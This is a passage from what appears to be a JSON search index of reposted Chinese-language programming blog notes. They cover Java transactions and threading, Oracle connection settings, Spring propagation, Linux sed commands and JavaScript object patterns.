      "url"      : "http://localhost:4000/2017/02/12/iteye-114/"
    } ,
  
    {
      "title"    : "java quartz",
      "category" : "iteye",
      "content": "应用observer 模式的一个好处是，处理定时触发的业务逻辑可以分散放在各个模块内部。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-115/"
    } ,
  
    {
      "title"    : "java quartz",
      "category" : "iteye",
      "content": "SessionScheduler 中 jobToBeExecuted 是回调的逻辑。这里通过Observer 模式通知到具体的业务模块去处理。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-116/"
    } ,
  
    {
      "title"    : "Ajax readystate状态",
      "category" : "iteye",
      "content": "XMLHttpRequest readyState  Integer reporting the status of the request: 0 = uninitialized 1 = loading  已调用open方法 2 = loaded  已调用send方法 3 = interactive 已接收部分数据 4 = completed 数据接收完毕,此时可以通过通过responseBody和responseText获取完整的回应数据 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-118/"
    } ,
  
    {
      "title"    : "SERVICE_NAME, SID和schema区别",
      "category" : "iteye",
      "content": " SID是Oracle实例名，实例名指的是用于响应某个数据库操作的数据库管理系统的名称。实例名是由初始化参数文件的参数instance_name决定的。如果这个参数不被指定(即instance_name没有被指定为任何值)，那么实例的名字由该用户的环境变量ORACLE_SID（注意这里是大写）决定。在windows平台下，则是注册表中oracle_sid值决定。 SID是Oracle实例的唯一名称标识，用户去访问数据库，实际上是向某一个Oracle实例发送请求，oracle实例负责向数据库获取数据。Oracle实例 = 内存结构+后台进程，所以Oracle实例是临时性的；可以通过startup nomount去启动实例，但是注意这时Oracle数据库并没有启动，需要用open去启动数据库； 一个实例只能对应一个数据库，一个数据库可以用多个实例；     2. SERVICE_NAME指的是listener中的全局数据库名：这个名字是由listener.ora中GLOBAL_DBNAME参数决定的。这个名字代表的是客户端连接到数据库时，tnsnames.ora中service_name参数所对应的值。 GLOBAL_DBNAME=DBNAME.DBDOMAIN     3. 连接字符串     配置tnsname.ora时，可以用SID,也可以用SERVICE_NAME.  注意这两个值不一定相同，具体要看数据库服务器中的配置。   connect_str =   (DESCRIPTION =     (ADDRESS_LIST =       (ADDRESS = (PROTOCOL = TCP)(HOST = xx.xx.xx.xx)(PORT = 1521))     )     (CONNECT_DATA =       (SERVICE_NAME = xxxx     )   )     connect_str =   (DESCRIPTION =     (ADDRESS_LIST =       (ADDRESS = (PROTOCOL = TCP)(HOST = xx.xx.xx.xx)(PORT = 1521))     )     (CONNECT_DATA =       (SID = xxx)       (SERVER = DEDICATED)     )   )   4.  schema 命名空间 命名空间定义了一组对象类型，在命名空间里，对象的名字必须是唯一的，当然，在不同的命名空间里，是可以使用相同的的名字的。Table，View，Sequence，Package等对象共享一个名字空间，所以同一个名字空间中不能有相同的。Indexes，Constraints，Triggers等对象有各自的名字空间，因此可以有相同的名字。   一般来说，Schema是基于用户的, 在数据库中创建一个用户，就创建了一个和用户名相同的Shema。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-119/"
    } ,
  
    {
      "title"    : "12306",
      "category" : "iteye",
      "content": " manage 用户的expectation，不要造成无谓的刷网页。许多网友提出的分布式队列是个好的思路。买票是用户选择排队，并知道当前还有多少票，有多少人在排，就不会有恐慌的心理了。   2. 前端网页的优化是必须的，不知道现在有没有用到CDN   3. 为什么有很多钱付了，票没了的情况？ 不知这其中的事务是怎么处理的。如果这是可接受并预先通知用户的话也罢... ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-12/"
    } ,
  
    {
      "title"    : "windows 端口与程序",
      "category" : "iteye",
      "content": "use &quot;netstat -b&quot; to see used ports and the executables using them   搜索打开的端口号： in Windows: netstat -an|find &quot;61616&quot;   in Linux: netstat -an|grep 61616   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-120/"
    } ,
  
    {
      "title"    : "process server 启动问题",
      "category" : "iteye",
      "content": "Process Server 启动时报错 Caused by: org.omg.CORBA.INTERNAL: CREATE_LISTENER_FAILED_4  vmcid: 0x49421000  minor code: 56  completed: No   Changing the host file fixed it. For windows : c:  windows  system32  drivers  etc  hosts 127.0.0.1 localhost . ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-121/"
    } ,
  
    {
      "title"    : "Java虚拟机",
      "category" : "iteye",
      "content": "摘自： http://www.ibm.com/developerworks/cn/java/j-lo-jvm-perf/    JVM 的实现 Sun Hotspot、IBM J9、Oracle JRockit        一. Java 堆和栈     类装载子系统：通过类的全限定名（包名和类名，网络装载还包括 URL）将 Class 装载进运行时数据区； 方法区：Class 对于所有方法和 static 静态数据的定义存储在这里，它就像一张表或数组，让程序执行时在这里找到相应方法的 Java 字节码和静态数据； Java 堆：Java 对象的持久化存储区，从类实例化而来的对象存储在此，垃圾收集也在此进行，若是空间不够容纳当前所有对象，Out Of Memory 的异常将会抛出，对 Java 堆和垃圾收集的认识对应用性能调优很关键；        创建的 Java 对象（包括数组，数组也是一种对象）分配在堆中，垃圾收集对象来释放空间； 最常设置的堆大小参数有：-Xms，设置堆的初始大小；-Xmx，设置堆空间的最大值；-Xmn，设置年轻代空间大小；-Xmo，设置年老代空间大小  Java 栈：Java 方法的字节码执行的地方，方法中局部变量的生命周期都在栈中，栈的大小是我们要考虑的一个关键点，它直接决定了方法调用的层数，这对递归程序来说尤为重要。我们所用的 JVM 都是基于 Java 栈的运行机制，而有一个例外的实现，Google 移动设备操作系统 Android 的虚拟机 Dalvik 则是基于寄存器的机制（Dalvik 虽然支持 Java 语言开发，但从虚拟机的角度看，并不符合 Java 标准），关于虚拟机实现时，栈和寄存器机制的比较，请参考论文“Virtual Machine Showdown: Stack Versus Registers”； 栈划分为操作数栈、栈帧数据和局部变量区，方法中分配的局部变量在栈中，同时每一次方法的调用都会在栈中分配栈帧. 对于基于栈的 Java 虚拟机，方法的调用和执行伴随着压栈和出栈操作。每个线程有各自独立的栈，由虚拟机来管理栈的大小，但我们应该对它的大小有个概念。栈的大小是把双刃剑，如果太小，可能会导致栈溢出，特别是在该线程内有递归、大的循环时出现溢出的可能性更大，如果过大，就会影响到可创建栈的数量，如果是多线程的应用，就会导致内存溢出。通过 -Xss可以设置 Java 栈的最大值，默认值为 256K。 程序计数器：对于基于栈实现的 JVM，这几乎是唯一寄存器了，它用来指示当前 Java 执行引擎执行到哪条 Java 字节码，指针指向方法区的字节码； 本地方法栈：这是 Java 调用操作系统本地库的地方，用来实现 JNI（Java Native Interface，Java 本地接口）； 执行引擎：JVM 的心脏，控制装入 Java 字节码并解析； 本地接口：连接了本地方法栈和操作系统库。   二.  Java内存泄漏例子      下面的pop1会引起内存泄漏 public class Stack { private static final int MAXLEN = 10; private Object stk[] = new Object[MAXLEN]; private int stkp = -1; public void push(Object p) { stk[++stkp] = p; } public Object pop1() { return stk[stkp--]; } public Object pop2() { Object p = stk[stkp]; stk[stkp--] = null; return p; } }     ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-122/"
    } ,
  
    {
      "title"    : "MQ/CICS",
      "category" : "iteye",
      "content": "CICS:  CICS 是一系列为 IBM和非 IBM 平台上的应用提供联机事务处理和事务管理的产品，其功能是为商业应用提供一个事务处理环境。CICS其全称是 Customer Information Control System，即客户信息控制系统。   RACF: Resource Access Control Facility（资源访问控制程序）是用于IBM主机（大型服务器）操作系统的安全管理产品RACF只分配给有权使用申请资源的用户的计算机系统（比如文件，打印序列，程序的运行空间等等）。为了实现这些，RACF识别并授权给一个用户，并决定这个用户可以使用什么样的资源，并且对非授权用户试图访问保护资源进行记录日志和报告。   3270: The IBM 3270 is a class of terminals made by IBM since 1972 (known as &quot;display devices&quot;) normally used to communicate with IBM mainframes. IBM stopped manufacturing terminals many years ago, but the IBM 3270 protocol is still commonly used via terminal emulation to access some mainframe-based applications. Accordingly, such applications are sometimes referred to as green screen applications. Use of 3270 is slowly diminishing over time as more and more mainframe applications acquire Web interfaces, but some web applications use the technique of &quot;screen scraping&quot; to capture old screens and transfer the data to modern front-ends. ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-123/"
    } ,
  
    {
      "title"    : "SOA设计",
      "category" : "iteye",
      "content": " SOA中为保持交易一致性广泛使用的 Compensation(冲正)  机制 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-124/"
    } ,
  
    {
      "title"    : "今日感悟",
      "category" : "iteye",
      "content": " 你很想乘上电梯门即将关上的电梯，如果你小跑一下，大多数情况下电梯里的人会等一下你；如果你面无表情，慢悠悠的，大多数情况下准备乘下一班吧。生活需要积极主动。   2. 看到马路上川流不息的车流，你也许会怀疑怎么会有我行进的空间。大多数情况下，你置身于车流时发现还有有你前进的距离。生活需要勇气和实践。宏观的看问题需要让你畏惧。有的问题没有你想象的难。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-125/"
    } ,
  
    {
      "title"    : "Websphere MQ",
      "category" : "iteye",
      "content": "WebSphere MQ 提供了处理大消息的两种方法：消息分片和消息分组。 消息分片和消息分组是在 WebSphere MQ 的编程中处理大消息的常用手段，到底采用哪种方式比较合适，需要根据实际的需求而定。如果大消息需要分割成有实际业务意义的一批小消息，那么采用消息分组比较合适；反之，如果大消息无法分割成有实际业务意义的小消息，那么就采用消息分片。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-127/"
    } ,
  
    {
      "title"    : "Read-Only transactions",
      "category" : "iteye",
      "content": "read-only=&quot;true|false&quot; 经常出现在Spring事务配置文件或者annotation 属性中，具体解释如下：     1. Spring documents describes:   Read-only status: a read-only transaction does not modify any data. Read-only transactions can be a useful optimization in some cases (such as when using Hibernate). 2. from Google   if the transaction is marked as read-only, Spring will set the Hibernate Session's flush mode to FLUSH_NEVER, and will set the JDBC transaction to read-only.   3. Hiberante   when a session's flush mode is set to FLUSH_NEVER, two things happen: First, running HQL queries no longer cause Hibernate to flush the session state to the database, which can provide a dramatic performance improvement. Secondly, Hibernate will not flush the changes before commiting the transaction. But the user can still call Session.flush() by hand, causing any modifications to be persisted to database.   4. Oracle   When using the Oracle JDBC driver, calling connection.setReadOnly(true) translates into the statement &quot;SET TRANSACTION READ ONLY&quot;. This statement limits the types of SQL statements that can be executed during the transaction. Only SELECTS (without 'FOR UPDATE') and a few other statements can be executed. Specifically, no UPDATEs, DELETEs, INSERTs or MERGEs can be executed. This behavior is Oracle-specific. Other RDBMS can have different semantics for read only transactions or simply not support it at all.       from:  http://www.codeinstructions.com/2009/04/read-only-transactions-with-spring-and.html ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-128/"
    } ,
  
    {
      "title"    : "Checkfree transaction",
      "category" : "iteye",
      "content": "Checkfree transaction managed in specified layer:   In a dedicated  class, say TransactionAdapter,  it encapsulated the transaction handling over com.checkfree.isolutions.persist.PersistServer   1. begainTransaction:  PersistServer.activate() -&gt; PersistServer.beginTransaction() 2. commitTransaction: PersistServer.commitTransaction() -&gt; PersistServer.deactivate() 3. rollbackTransaction: PersistServer.rollbackTransaction() -&gt; PersistServer.deactivate() try{                    txnStarted = TransactionAdapter.beginTransaction();                  //    boolean flag = checkfree invocation }finally{                  if(flag == &quot;success&quot; )                           TransactionAdapter.commitTransaction(txnStarted);                 else                             TransactionAdapter.rollbackTransaction(txnStarted);   }     ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-129/"
    } ,
  
    {
      "title"    : "数据结构",
      "category" : "iteye",
      "content": " bloom filter 用于测试一个元素是否在一个很大的数据集中。方法是利用多个hash函数，数据集中的元素通过hash函数到一个位置。查询时，做相同的hash查找。只要有一个hash函数没有match到对应的位置就可以判定该元素不在数据集中。所以该方法可能有false positive但一定没有false Negative。   2. suffix array/tree 把一个字符串的所有后缀字符串按字典排序，另外还可以加上LCP（Longest Common Prefix） ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-13/"
    } ,
  
    {
      "title"    : "JAX-RPC与JAX-WS",
      "category" : "iteye",
      "content": "JAX-WS是JAX-RPC的下一个版本，它们的区别有： 1. JAX-RPC支持SOAP 1.1     JAX-WS支持SOAP 1.1 和 SOAP 1.2   2. JAX-RPC 对应的是Java 1.4     JAX-WS 对应的是 Java 5   3. JAX-RPC 有自己的XML - Java 映射模型     JAX-WS 采用 JAXB   4. JAX-WS 引入了异步，动态服务器模型等功能   5. JAX-RPC 支持WS-I Basic Profile V1.0     JAX-WS 支持WS-I Basic Profile V1.1     应该是互操作性更好了   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-130/"
    } ,
  
    {
      "title"    : "Java序列化",
      "category" : "iteye",
      "content": "一般序列化的方式有： 1. 通过JDK 的Serializable接口序列化成二进制字节流     RMI，EJB，分布式应用中需要用到     注意序列化的是类的数据成员，而不是方法       1.1 可以通过Externalizable接口( readExternal, writeExternal)定制Seriealizable过程      1.2 三种情况不会序列化       1）static field，序列化的是对象的状态       2）transient 类变量       3）父类成员变量（由父类负责序列化）   2. 序列化成XML     XML-RPC，SOAP等序列化成XML进行Web Service之类的远程调用     常用的框架有：xstream, JAXB,etc.   3. 序列化成JSON(Javascript Object Notation)     轻量级的序列化方式 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-131/"
    } ,
  
    {
      "title"    : "编程事务",
      "category" : "iteye",
      "content": "Programmatic Transaction Model应用的场景有： 1. 客户端bean发起一个事务,并把事务传播到调用的EJB中去，这些EJB用Declarative Transaction. 该方法解决了transation context不能在编程事务管理bean中传播的问题   2. 考虑到性能问题，有时我们只需要在关键的Case中需要用到事务，比如转账。其他周边Case不进行事务控制。这是可以考虑用编程事务。有时也称为Localized JTA Transations。声明式的事务可能没有编程式的灵活。个人理解，瞎猜的，没有用过。   3. 长事务， 放在一个stateful sessionBean中。虽然是一种Poor Design， 但还只有编程事务好处理。因为声明事务不好去划分事务的边界（propagation 和 isolation level). 个人理解，瞎猜的，没有用过。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-132/"
    } ,
  
    {
      "title"    : "Transaction Attribute",
      "category" : "iteye",
      "content": "        2. Spring Framework 支持的事务属性 1） PROPAGATION_REQUIRED --支持当前的事务，如果不存在就创建一个新的。这是最常用的选择。 2） PROPAGATION_SUPPORTS --支持当前的事务，如果不存在就不使用事务。 3） PROPAGATION_MANDATORY --支持当前的事务，如果不存在就抛出异常。 4）PROPAGATION_REQUIRES_NEW --创建一个新的事务，并暂停当前的事务（如果存在）。 5） PROPAGATION_NOT_SUPPORTED --不使用事务，并暂停当前的事务（如果存在）。 6） PROPAGATION_NEVER --不使用事务，如果当前存在事务就抛出异常。 7） PROPAGATION_NESTED --如果当前存在事务就作为嵌入事务执行，否则与PROPAGATION_REQUIRED类似。     3. 注意事项   1）PROPAGATION_REQUIRES_NEW 与 PROPAGATION_NESTED      PROPAGATION_REQUIRES_NEW 启动一个新的, 不依赖于环境的 &quot;内部&quot; 事务. 这个事务将被完全 commited 或 rolled back 而不依赖于外部事务, 它拥有自己的隔离范围, 自己的锁, 等等. 当内部事务开始执行时, 外部事务将被挂起, 内务事务结束时, 外部事务将继续执行.      另一方面, PROPAGATION_NESTED 开始一个 &quot;嵌套的&quot; 事务,  它是已经存在事务的一个真正的子事务. 潜套事务开始执行时,  它将取得一个 savepoint. 如果这个嵌套事务失败, 我们将回滚到此 savepoint. 潜套事务是外部事务的一部分, 只有外部事务结束后它才会被提交. Savepoint需要最新的JDBC规范来支持。JDBC3?     由此可见, PROPAGATION_REQUIRES_NEW 和 PROPAGATION_NESTED 的最大区别在于, PROPAGATION_REQUIRES_NEW 完全是一个新的事务, 而 PROPAGATION_NESTED 则是外部事务的子事务, 如果外部事务 commit, 嵌套事务也会被 commit, 这个规则同样适用于 roll back.   2）Required和mandatory事务属性 一般写操作配置成这两种事务。 两种都支持transaction context. 区别在如果调用时没有transaction context, Required的会发起一个新的事务。而mandatory的会抛出异常。   深层次的区别基于下面的规则： With the exception of the stateful session bean, the method that starts a transaction must be the same method that terminates the transaction.   因为Required不能确认事务是否是在此方法中启动的还是从外面传进来的，因此不知道是否该做rollback这种处理当出现异常时。而Mandatory确认事务都是从外面传入的，因此知道自己不需要处理这种逻辑。   也就是说，如果事务不是在该层发起(客户端发起传入的），那么该层写操作就配置成Mandatory属性，要求调用方必须传入Transaction context；反之事务发起的层写操作应该设成required, 因为它可以控制事务的发起，回滚，提交等。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-133/"
    } ,
  
    {
      "title"    : "多线程",
      "category" : "iteye",
      "content": "实现多线程： 1. extends Thread   2. implement Runnable interface     线程应该用start 方法来启动。直接运行Run 方法并没有启动多线程，还是在主线程中执行run方法，跟普通方法调用一样。     3. 一般倾向于用new Thread(Runnable)这种方式而不是继承Thread，理由有二： 1. 用Runnable接口可以留下多继承的余地 2. 不会因为Thread类继承下来的锁或者方法相互干扰     sleep()     join()，相当与thread实例.wait,会释放thread实例对应的锁。对于锁应该声明一个私有的对象锁，这样不会暴露到外面去引起误用。     private final Object lock = new Object();       误用的例子如下：     比如创建一个新的Thread实例，系统都会获取Thread类上的锁。以下代码会阻止新线程的创建。 synchronized(Thread.class){ Thread.sleep(Long.MAX_VALUE); }     4. Synchronized 方法的锁是针对不同线程的，不同线程只能顺序执行该同步方法。但是同一个线程可以重复地获得某个相同的锁。也即可以调用别的Synchronized 方法，只要用的是同一把锁。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-134/"
    } ,
  
    {
      "title"    : "覆盖重载隐藏遮蔽遮掩",
      "category" : "iteye",
      "content": " override 覆写     用于实例方法，签名相同，动态分派     a) 子类方法限定要大于等于父类。即限定变大了。     b) Never add exception types to the throws clause of a method overridden in a subclass         也即不能添加更多的异常到子类签名中。可以是父类异常的子类异常，甚至不加异常。所以异常应该是变小了。这主要是为了遵守Liskov OOP 替换原则。子类必须能替换父类，如果子类里有新加的异常，Try/Catch起码要引起变动。相反，子类没有异常并不影响现有的代码。   2. Hide 隐藏  子类属性隐藏父类的，也即父类属性不能继承到子类中（相同名字的话，可以是不同类型）。当然可以通过把子类转型到父类访问父类的属性。这是与覆写不同的地方。 a)  private 属性根据dynamic type决定 frendly,pretected,public 属性根据static type 决定 静态属性根据类名决定，与类实例无关(即使是static final 类型的子类亦可Hide)   3. overload 重载  父类frendly / pretected / public 方法会继承到子类中，这时父类和子类中相同的方法签名也是overload(重载）。并不是只有定义在一个类中的方法才构成重载。 注意重载哪个方法是在编译时选择的，这与Override非常不同。    4. shadow 遮蔽 变量，方法或类型都有可能 常见的是临时变量遮蔽了类变量或者全局变量。对象方法遮蔽了static import进来的方法。 外围类（enclosing class）包含一个内部类（inner class），内部类（比如继承Thread类）继承的成员方法（比如sleep)遮蔽了外围累（enclosing class)的方法。    5. obscure 遮掩 变量可以遮掩类型，类型可以遮掩包。也即优先级不一样 比如声明一个变量名字为System（非正规的命名），该变量System会obscure Java系统类型System   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-135/"
    } ,
  
    {
      "title"    : "Transaction Design Pattern",
      "category" : "iteye",
      "content": "有三种方式处理事务的模式   1. Client Own Transaction 应用场景：        服务端Service 组件不允许修改，且都是细粒度的服务，一次调用不能满足一个ACID的业务请求        由于客户端transaction context需要传播propagation到Server端，需要RMI协议支持。好像Spring中不支持。        通过RMI，EJB这种方式的话要求客户端用programmatic 事务处理，服务端需要用declarative 事务处理。这是因为transaction context不能在programmatic事务处理中传播。     缺点：        多次远程服务调用影响性能   方式：        统一由客户端发起，提交，rollback事务。        Server端组件事务读操作声明成support, 其他写操作需声明成Mandatory   2. Domain Service Own Transaction   应用场景：        服务端提供了粗粒度的服务封装        客户端不能管理事务，如Web Service Client(服务端封装成了Web Service)         减轻客户端的复杂度   方式：        事务只在这一层处理发起，提交，rollback        Server端组件事务读操作声明成support, 其他写操作需声明成Required   3. Service Delegate Own Transaction        以上1和2的折中，相当于在Client和Server之间加入了一个Business Delegate层。        事务统一在这一层处理。        好处：        后端的Server层可以剥离Transaction相关的API，用POJO写 缺点：        客户端的逻辑（如一次请求多个服务端的调用）需要移到这一层，可能依赖于UI层的框架API，如HttpServletRequest之类的      方式：        该层方法事务读操作声明成support, 其他写操作需声明成Required   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-136/"
    } ,
  
    {
      "title"    : "在classpath上搜索类",
      "category" : "iteye",
      "content": "编译器在当前的classloader的classpath上找到类.方法（名字相同的即可，不需要签名相同），并在其中挑选（可能有重载）一个。如果没有找到签名相同的并不会到别的class library中或者上一级classloader中去寻找，而是直接报错。除非当前类中根本就没有这个名字的方法。   sorry, 上面的理解是错误的。真实的原因是“方法遮蔽”造成的。比如内部类中方法会遮蔽同名（可以不考虑参数）的外部类中的方法。－－－－Thread.sleep()     ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-137/"
    } ,
  
    {
      "title"    : "导出page and portlet in IBM portal server",
      "category" : "iteye",
      "content": "XMLAccess 是一个小型的独立应用程序程序，它使用 HTTP 连接与服务器进行连接。因此，可以访问和远程配置门户网站。）一般在portal 安装目录  bin 下面 xmlaccess.bat。   1. 导出portal page   xmlaccess.bat -in d:***  ExportPage.xml -user ***-pwd *-url http://host/wps/config -out d:*  result_exportPage.xml    ExportPage.xml 文件格式可以参考 Portal安装目录  doc  xml-samples   例如： &lt;!-- sample for exporting a page --&gt; &lt;portal action=&quot;locate&quot;&gt; &amp;lt;content-node action=&amp;quot;export&amp;quot; uniquename=&amp;quot;ibm.portal.Documents.Welcome&amp;quot; /&amp;gt; &lt;/portal&gt;     其他还有导入导出portlet, page 等。   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-138/"
    } ,
  
    {
      "title"    : "jQuery学习",
      "category" : "iteye",
      "content": " jQuery, window.jQuery, window.$ or simply $ can be used interchangeably   2.  window.onload 和 $(document).ready(function()）        // Override the onload event window.onload = function(){ // the page finished loading, do something here... }   This code actually overrides the onload event of the HTML tag. All this means to us is that our code will be executed soon as the page is finished loading. It makes sense because sometimes pages take time to load, or the downloading process is segmented by the browser architecture.     The jQuery internal architecture also utilizes the window.onload event, but before it does so, it checks whether the entire DOM (document object model) has been loaded because it is very important. It is not enough for jQuery to know that the page has been loaded, we must ensure that the DOM has been fully constructed. To provide us with this functionality, jQuery gives us a new method called ready that we can call on the main jQuery object itself. ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-139/"
    } ,
  
    {
      "title"    : "linux 命令收集",
      "category" : "iteye",
      "content": " 不显示/etc/services #开头的行, /etc/services文件并没有修改 sed -e '/^#/d' /etc/services | more 2. 忽略前十行，显示后面的内容 sed -e '1,10d' /etc/services | more 3. 打印所有包括BEGIN的行和END行之间的行的内容 sed -n -e '/BEGIN/,/END/p' /my/test/file | more 4. SAR pidstat -p 3132 2 5 //每隔2秒，显示5次，PID为３１３２的进程的CPU使用情况显示 pidstat -p 3132 2 5 -r //每隔2秒，显示5次，PID为３１３２的进程的内存使用情况显示 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-14/"
    } ,
  
    {
      "title"    : "TDD",
      "category" : "iteye",
      "content": "TDD 优点：   1. 重构的勇气，回归测试一下即可   2. 保证代码的高内聚，低耦合 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-140/"
    } ,
  
    {
      "title"    : "Javascript的this用法",
      "category" : "iteye",
      "content": "摘自：http://www.ruanyifeng.com/blog/2010/04/using_this_keyword_in_javascript.html     this是Javascript语言的一个关键字。 它代表函数运行时，自动生成的一个内部对象，只能在函数内部使用。比如， 　　function test(){ 　　　　this.x = 1; 　　} 随着函数使用场合的不同，this的值会发生变化。但是有一个总的原则，那就是this指的是，调用函数的那个对象。 下面分四种情况，详细讨论this的用法。 情况一：纯粹的函数调用 这是函数的最通常用法，属于全局性调用，因此this就代表全局对象Global。 请看下面这段代码，它的运行结果是1。 　　function test(){ 　　　　this.x = 1; 　　　　alert(this.x); 　　} 　　test(); // 1 为了证明this就是全局对象，我对代码做一些改变： 　　var x = 1; 　　function test(){ 　　　　alert(this.x); 　　} 　　test(); // 1 运行结果还是1。再变一下： 　　var x = 1; 　　function test(){ 　　　　this.x = 0; 　　} 　　test(); 　　alert(x); //0 情况二：作为对象方法的调用 函数还可以作为某个对象的方法调用，这时this就指这个上级对象。 　　function test(){ 　　　　alert(this.x); 　　} 　　var o = {}; 　　o.x = 1; 　　o.m = test; 　　o.m(); // 1 情况三 作为构造函数调用 所谓构造函数，就是通过这个函数生成一个新对象（object）。这时，this就指这个新对象。 　　function test(){ 　　　　this.x = 1; 　　} 　　var o = new test(); 　　alert(o.x); // 1 运行结果为1。为了表明这时this不是全局对象，我对代码做一些改变： 　　var x = 2; 　　function test(){ 　　　　this.x = 1; 　　} 　　var o = new test(); 　　alert(x); //2 运行结果为2，表明全局变量x的值根本没变。 情况四 apply调用 apply()是函数对象的一个方法，它的作用是改变函数的调用对象，它的第一个参数就表示改变后的调用这个函数的对象。因此，this指的就是这 第一个参数。 　　var x = 0; 　　function test(){ 　　　　alert(this.x); 　　} 　　var o={}; 　　o.x = 1; 　　o.m = test; 　　o.m.apply(); //0 apply()的参数为空时，默认调用全局对象。因此，这时的运行结果为0，证明this指的是全局对象。 如果把最后一行代码修改为 　　o.m.apply(o); //1 运行结果就变成了1，证明了这时this代表的是对象o。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-141/"
    } ,
  
    {
      "title"    : "Javascript 面向对象编程（一）：封装",
      "category" : "iteye",
      "content": "摘自：http://www.ruanyifeng.com/blog/2010/05/object-oriented_javascript_encapsulation.html   Javascript 面向对象编程（一）：封装 作者：阮一峰 Javascript是一种基于对象（object-based）的语言，你遇到的所有东西几乎都是对象。但是，它又不是一种真正的面向对象编程（OOP）语言，因为它的语法中没有class（类）。 那么，如果我们要把&quot;属性&quot;（property）和&quot;方法&quot;（method），封装成一个对象，甚至要从原型对象生成一个实例对象，我们应该怎么做呢？ 1. 生成对象的原始模式 假定我们把猫看成一个对象，它有&quot;名字&quot;和&quot;颜色&quot;两个属性。 　　var Cat = { 　　　　name : '', 　　　　color : '' 　　} 现在，我们需要根据这个原型对象，生成两个实例对象。 　　var cat1 = {};   // 或者 var cat1 = new Object(); 　　　　cat1.name = &quot;大毛&quot;; 　　　　cat1.color = &quot;黄色&quot;; 　　var cat2 = {}; 　　　　cat2.name = &quot;二毛&quot;; 　　　　cat2.color = &quot;黑色&quot;; 好了，这就是最简单的封装了。但是，这样的写法有两个缺点，一是如果多生成几个实例，写起来就非常麻烦；二是实例与原型之间，没有任何办法，可以看出有什么联系。 2. 原始模式的改进 我们可以写一个函数，解决代码重复的问题。 //using Literal Notation　　 function Cat(name,color){ 　　　　return { 　　　　　　name:name, 　　　　　　color:color 　　　　} 　　} 然后生成实例对象，就等于是在调用函数： 　　var cat1 = Cat(&quot;大毛&quot;,&quot;黄色&quot;); 　　var cat2 = Cat(&quot;二毛&quot;,&quot;黑色&quot;); 这种方法的问题依然是，cat1和cat2之间没有内在的联系，不能反映出它们是同一个原型对象的实例。 3. 构造函数模式 为了解决从原型对象生成实例的问题，Javascript提供了一个构造函数（Constructor）模式。 所谓&quot;构造函数&quot;，其实就是一个普通函数，但是内部使用了this 变量 。对构造函数使用new运算符，就能生成实例，并且this变量会绑定在实例对象上。 比如，猫的原型对象现在可以这样写， 　　function Cat(name,color){ 　　　　this.name=name; 　　　　this.color=color; 　　} 我们现在就可以生成实例对象了。 　　var cat1 = new Cat(&quot;大毛&quot;,&quot;黄色&quot;); 　　var cat2 = new Cat(&quot;二毛&quot;,&quot;黑色&quot;); 　　alert(cat1.name); // 大毛 　　alert(cat1.color); // 黄色 这时cat1和cat2会自动含有一个constructor属性，指向它们的构造函数。 　　alert(cat1.constructor == Cat); //true 　　alert(cat2.constructor == Cat); //true Javascript还提供了一个instanceof运算符，验证原型对象与实例对象之间的关系。 　　alert(cat1 instanceof Cat); //true 　　alert(cat2 instanceof Cat); //true 4. 构造函数模式的问题 构造函数方法很好用，但是存在一个浪费内存的问题。 请看，我们现在为Cat对象添加一个不变的属性&quot;type&quot;（种类），再添加一个方法eat（吃老鼠）。那么，原型对象Cat就变成了下面这样： 　　function Cat(name,color){ 　　　　this.name = name; 　　　　this.color = color; 　　　　this.type = &quot;猫科动物&quot;; 　　　　this.eat = function(){alert(&quot;吃老鼠&quot;);}; 　　} 还是采用同样的方法，生成实例： 　　var cat1 = new Cat(&quot;大毛&quot;,&quot;黄色&quot;); 　　var cat2 = new Cat (&quot;二毛&quot;,&quot;黑色&quot;); 　　alert(cat1.type); // 猫科动物 　　cat1.eat(); // 吃老鼠 表面上好像没什么问题，但是实际上这样做，有一个很大的弊端。那就是对于每一个实例对象，type属性和eat()方法都是一模一样的内容，每一次生成一个实例，都必须为重复的内容，多占用一些内存。这样既不环保，也缺乏效率。 　　alert(cat1.eat == cat2.eat); //false 能不能让type属性和eat()方法在内存中只生成一次，然后所有实例都指向那个内存地址呢？回答是可以的。 5. Prototype模式 Javascript规定，每一个构造函数都有一个prototype属性，指向另一个对象。这个对象的所有属性和方法，都会被构造函数的实例继承。 这意味着，我们可以把那些不变的属性和方法，直接定义在prototype对象上。 　　function Cat(name,color){ 　　　　this.name = name; 　　　　this.color = color; 　　} 　　Cat.prototype.type = &quot;猫科动物&quot;; 　　Cat.prototype.eat = function(){alert(&quot;吃老鼠&quot;)}; 然后，生成实例。 　　var cat1 = new Cat(&quot;大毛&quot;,&quot;黄色&quot;); 　　var cat2 = new Cat(&quot;二毛&quot;,&quot;黑色&quot;); 　　alert(cat1.type); // 猫科动物 　　cat1.eat(); // 吃老鼠 这时所有实例的type属性和eat()方法，其实都是一个内存地址，指向prototype对象，因此就提高了运行效率。 　　alert(cat1.eat == cat2.eat); //true 6. Prototype模式的验证方法 6.1 isPrototypeOf() 这个方法用来判断，某个proptotype对象和某个实例之间的关系。 　　alert(Cat.prototype.isPrototypeOf(cat1)); //true 　　alert(Cat.prototype.isPrototypeOf(cat2)); //true 6.2 hasOwnProperty() 